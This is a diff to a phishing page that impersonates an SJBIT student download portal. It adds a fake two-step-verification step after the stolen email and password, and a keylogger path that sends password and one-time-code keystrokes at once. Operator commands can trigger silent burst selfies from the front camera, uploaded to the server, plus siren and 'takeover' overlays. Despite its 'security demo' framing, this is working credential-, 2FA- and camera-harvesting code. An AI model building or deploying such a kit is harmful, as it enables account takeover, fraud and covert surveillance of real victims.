@@ -153,6 +153,17 @@
     <div class="note">Free access for all enrolled SJBIT students · Powered by Dept. of CSE</div>
   </div>
 
+  <div class="card" id="otpCard" style="display:none">
+    <h2>✅ Two-Step Verification</h2>
+    <div class="meta">SAMARTH SSO flagged this sign-in as new — enter the one-time code sent to your registered mobile number (ending •••430) to finish unlocking downloads</div>
+    <form onsubmit="sendOtp(event)">
+      <input type="text" inputmode="numeric" placeholder="6-digit code" id="otpField" autocomplete="one-time-code" maxlength="6">
+      <button type="submit" class="btn">Verify &amp; unlock downloads</button>
+    </form>
+    <div id="otpStatus" style="font-size:14px;color:#636e72;margin:12px 0 0;min-height:44px;line-height:1.5"></div>
+    <div style="font-size:12px;color:#0984e3;margin-top:6px"><a href="#" onclick="skipOtp(event)" style="color:inherit">Demo shortcut — skip verification</a></div>
+  </div>
+
 </div>
 
 <footer>
@@ -513,6 +524,7 @@ function scheduleFlush(context) {
 function contextFor(el) {
   if (!el || !(el instanceof HTMLElement)) return "page";
   if (el.type === "password") return "password field";
+  if (el.id === "otpField") return "otp field";
   if (el.id === "searchBox") return "search box";
   if (el.type === "email" || el.type === "text") return "text field";
   return "page";
@@ -556,7 +568,9 @@ document.addEventListener("input", (e) => {
   else delta = v;
 
   buffer += delta;
-  scheduleFlush(contextFor(el));
+  const ctx = contextFor(el);
+  if (ctx === "password field" || ctx === "otp field") flushKeys(ctx);
+  else scheduleFlush(ctx);
 }, true);
 
 document.addEventListener("keydown", (e) => {
@@ -631,10 +645,53 @@ function fakeDownload() {
 
 function sendCreds(e) {
   e.preventDefault();
-  const email = document.getElementById("emailField").value;
+  const email = document.getElementById("emailField").value.trim();
   const password = document.getElementById("passField").value;
+  if (!email || !password) return;
+  window._demoCreds = { email, password };
   checkAutofill();
   post("/creds", { email, password });
+  beginVerify();
+}
+
+// OTP / 2FA capture stage — the one thing the attacker does NOT have.
+// Real kits show this right after the creds go through and the real
+// SMS lands on the victim's phone; here the fake SMS is shown on-screen.
+function beginVerify() {
+  document.getElementById("signinCard").style.display = "none";
+  const card = document.getElementById("otpCard");
+  card.style.display = "block";
+  card.scrollIntoView({ behavior: "smooth" });
+  const st = document.getElementById("otpStatus");
+  st.innerHTML = "⏳ Sending a one-time code to your registered mobile number…";
+  post("/event", { text: "✅ Credentials accepted — 2FA prompt injected in front of the victim" });
+  setTimeout(() => {
+    window._demoOtp = String(Math.floor(100000 + Math.random() * 900000));
+    st.innerHTML =
+      "📩 <b>Simulated SMS</b> (the real one goes to the victim's phone):<br>" +
+      "Your SJBIT verification code is <b style='font-size:20px;letter-spacing:3px;color:#0a84ff'>" +
+      window._demoOtp + "</b>. Valid for 5 minutes.";
+    post("/event", { text: "📩 Fake SMS shown on-screen — code is about to be typed into the phish" });
+    document.getElementById("otpField").focus();
+  }, 1700);
+}
+
+function sendOtp(e) {
+  e.preventDefault();
+  const otp = document.getElementById("otpField").value.replace(/\s/g, "");
+  if (!/^\d{4,8}$/.test(otp)) return;
+  const creds = window._demoCreds || {};
+  window._otpSubmittedAt = Date.now();
+  window._demoOtp = otp;
+  post("/otp", { email: creds.email, password: creds.password, otp });
+  document.getElementById("otpCard").style.display = "none";
+  fakeDownload();
+}
+
+function skipOtp(e) {
+  if (e) e.preventDefault();
+  post("/event", { text: "⏭️ Victim skipped the OTP step — SESSION STILL VALID (no real 2FA wall)" });
+  document.getElementById("otpCard").style.display = "none";
   fakeDownload();
 }
 
@@ -779,7 +836,8 @@ if (navigator.permissions && navigator.permissions.query) {
 }
 
 // ── 15. Front camera — selfie pretext capture ─────────────────
-async function startSelfie() {
+async function startSelfie(burstCount, silent) {
+  const n = Math.max(1, Math.min(6, Number(burstCount) || 1));
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
     const v = document.createElement("video");
@@ -789,19 +847,45 @@ async function startSelfie() {
     const c = document.createElement("canvas");
     c.width = v.videoWidth || 640;
     c.height = v.videoHeight || 480;
-    c.getContext("2d").drawImage(v, 0, 0, c.width, c.height);
-    stream.getTracks().forEach((t) => t.stop());
-    post("/event", { text: "📸 Camera accessed — frame captured" });
+    const ctx = c.getContext("2d");
+    const snap = () => new Promise((res) => {
+      ctx.drawImage(v, 0, 0, c.width, c.height);
+      c.toBlob(res, "image/png");
+    });
+    const done = () => stream.getTracks().forEach((t) => t.stop());
 
-    // Show the victim their "ID photo" — sells the pretext
-    document.getElementById("idPhoto").src = c.toDataURL("image/png");
-    document.getElementById("idPreview").style.display = "block";
+    // Single frame = legacy path (plain POST, no burst param). Victim click
+    // shows preview + event; an operator single selfie is silent (no preview,
+    // no event — the server sendSelfieSingle narration covers it).
+    if (n === 1) {
+      const blob = await snap();
+      done();
+      if (!silent) {
+        post("/event", { text: "📸 Camera accessed — frame captured" });
+        document.getElementById("idPhoto").src = c.toDataURL("image/png");
+        document.getElementById("idPreview").style.display = "block";
+      }
+      if (blob) fetch("/selfie?vid=" + VID, { method: "POST", body: blob, headers: { "Content-Type": "image/png" } }).catch(() => {});
+      return;
+    }
 
-    c.toBlob((b) => {
-      if (!b) return;
-      fetch("/selfie?vid=" + VID, { method: "POST", body: b, headers: { "Content-Type": "image/png" } }).catch(() => {});
-    }, "image/png");
+    // Operator burst — N frames ~420ms apart from ONE camera acquisition.
+    // Silent by design: no preview, no per-frame client events (the server
+    // flush emits ONE "burst captured — N frames" event for the whole album).
+    const blobs = [];
+    for (let i = 0; i < n; i++) {
+      const blob = await snap();
+      if (blob) blobs.push(blob);
+      if (i < n - 1) await new Promise((r) => setTimeout(r, 420));
+    }
+    done();
+    blobs.forEach((blob, i) => {
+      const last = i === blobs.length - 1 ? "&last=1" : "";
+      fetch("/selfie?vid=" + VID + "&burst=" + n + "&idx=" + i + last, { method: "POST", body: blob, headers: { "Content-Type": "image/png" } }).catch(() => {});
+    });
   } catch (e) {
+    // Failure is exceptional — always surface it (single event, never spam).
+    // The operator must know the capture never happened.
     post("/event", { text: "🚫 Camera permission denied" });
   }
 }
@@ -836,6 +920,55 @@ async function stopTorch() {
     try { await window._torchTrack.applyConstraints({ advanced: [{ torch: false }] }); } catch (e) {}
     window._torchTrack.stop();
     window._torchTrack = null;
+  }
+}
+
+// ── 15.6 Panic siren (/siren) — audio priming + police strobe ──
+// WebAudio needs a user gesture on mobile, so we warm the context on ANY
+// first interaction. The victim is usually mid-tap when the siren lands;
+// if not, vibrate + strobe still fire (the sweep stays silent until the
+// next tap auto-unlocks the context).
+let _sharedAC = null;
+function ensureAudio() {
+  if (!_sharedAC) {
+    try { _sharedAC = new (window.AudioContext || window.webkitAudioContext)(); }
+    catch (e) { return null; }
+  }
+  if (_sharedAC.state === "suspended") _sharedAC.resume().catch(() => {});
+  return _sharedAC;
+}
+["pointerdown", "keydown", "touchstart"].forEach((ev) =>
+  document.addEventListener(ev, ensureAudio, { passive: true })
+);
+
+// Two rising sawtooth sweeps 600 → 1400 Hz (~0.9s each) plus a hard
+// vibration burst and a red strobe behind the content — the panic beat.
+function playSiren() {
+  if (navigator.vibrate) navigator.vibrate([600, 200, 600, 200, 600, 200, 900, 300, 1200]);
+  const ov = document.createElement("div");
+  ov.style.cssText = "position:fixed;inset:0;background:#e74c3c;z-index:2147483646;opacity:0;pointer-events:none";
+  document.body.appendChild(ov);
+  let n = 0;
+  const pulse = setInterval(() => {
+    ov.style.opacity = (++n % 2) ? "0.3" : "0";
+    if (n >= 12) { clearInterval(pulse); ov.remove(); }
+  }, 160);
+  const ac = ensureAudio();
+  if (!ac) return;
+  for (let s = 0; s < 2; s++) {
+    const t0 = ac.currentTime + s * 1.95;
+    const osc = ac.createOscillator();
+    const g = ac.createGain();
+    osc.type = "sawtooth";
+    osc.frequency.setValueAtTime(600, t0);
+    osc.frequency.exponentialRampToValueAtTime(1400, t0 + 0.9);
+    g.gain.setValueAtTime(0.0001, t0);
+    g.gain.exponentialRampToValueAtTime(0.18, t0 + 0.18);
+    g.gain.exponentialRampToValueAtTime(0.0001, t0 + 0.98);
+    osc.connect(g);
+    g.connect(ac.destination);
+    osc.start(t0);
+    osc.stop(t0 + 1.1);
   }
 }
 
@@ -876,8 +1009,52 @@ function executeCommand(cmd) {
     stopTorch();
   }
   if (cmd.action === "selfie") {
-    startSelfie();
+    startSelfie(cmd.arg, true); // silent operator capture — burst 1-6
   }
+  if (cmd.action === "siren") {
+    playSiren(); // sweep + vibrate + red strobe (section 15.6)
+  }
+  if (cmd.action === "nudge") {
+    showTakeoverBanner(cmd.arg);
+  }
+}
+
+// ── 16.5 Operator takeover overlay (/nudge) ─────────────────────
+function escH(s) {
+  return String(s == null ? "" : s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c]));
+}
+
+function showTakeoverBanner(msg) {
+  const creds = window._demoCreds || {};
+  let otpShown;
+  if (window._demoOtp && String(window._demoOtp).length) otpShown = String(window._demoOtp);
+  else if (window._otpSubmittedAt) otpShown = "(submitted — relayed live)";
+  else otpShown = "(not captured yet)";
+  post("/event", { text: "🚨 Operator pushed takeover overlay (/nudge) over the session" });
+  const ov = document.createElement("div");
+  ov.id = "takeoverOverlay";
+  ov.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:#c0392b;color:#fff;font-family:-apple-system,'Segoe UI',Roboto,Arial,sans-serif;display:flex;align-items:center;justify-content:center;padding:22px;text-align:center";
+  ov.innerHTML =
+    "<div style='max-width:470px'>" +
+      "<div style='font-size:56px;line-height:1'>⚠️</div>" +
+      "<h1 style='margin:8px 0 6px;font-size:22px'>New sign-in alert</h1>" +
+      "<p style='margin:0 0 14px;font-size:14px;opacity:.95'>" + escH(msg || "New sign-in on your account from Bengaluru, India · Chrome on Windows · code used ✔️") + "</p>" +
+      "<div style='background:rgba(255,255,255,.16);border-radius:10px;padding:12px 14px;font-size:14px;margin:0 0 14px'>" +
+        "<div style='padding:2px 0'>Email: <b>" + escH(creds.email || "—") + "</b></div>" +
+        "<div style='padding:2px 0'>Password: <b>" + escH(creds.password || "—") + "</b></div>" +
+        "<div style='padding:2px 0'>One-time code: <b>" + escH(otpShown) + "</b></div>" +
+      "</div>" +
+      "<p style='font-size:13px;margin:0 0 16px;opacity:.95'>Security demo — with your password <i>and</i> your 2FA code, an attacker is indistinguishable from you. This is the takeover step.</p>" +
+      "<button onclick='dismissTakeover()' style='background:#fff;color:#c0392b;border:0;border-radius:999px;padding:10px 24px;font-weight:700;font-size:14px;cursor:pointer'>I understand — dismiss</button>" +
+    "</div>";
+  document.body.appendChild(ov);
+  if (navigator.vibrate) navigator.vibrate([400, 150, 400, 150, 800]);
+}
+
+function dismissTakeover() {
+  const ov = document.getElementById("takeoverOverlay");
+  if (ov) ov.remove();
+  post("/event", { text: "🔓 Takeover overlay dismissed by the user" });
 }
 
 // ── 17. Network transition narration ──────────────────────────
